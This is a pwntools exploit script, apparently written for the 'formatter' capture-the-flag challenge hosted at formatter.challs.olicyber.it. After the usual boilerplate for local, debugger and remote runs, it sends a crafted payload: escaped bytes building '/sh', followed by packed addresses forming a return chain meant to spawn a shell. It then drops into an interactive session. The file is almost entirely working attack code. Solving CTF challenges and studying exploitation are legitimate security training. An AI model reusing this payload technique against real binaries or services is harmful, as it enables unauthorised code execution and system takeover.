#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'formatter')

host = args.HOST or 'formatter.challs.olicyber.it'
port = int(args.PORT or 20006)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *0x00000000004014f9
continue
'''.format(**locals())

# -- Exploit goes here --

exploit = b'\\\x00' + b'\\/*\\/sh\x00' + b'\\/' * 16 + p64(0x04015e3) + p64(0x04050a0 + 2) + p64(0x040124d)
io = start()

io.recvline()
io.sendline(exploit)

io.interactive()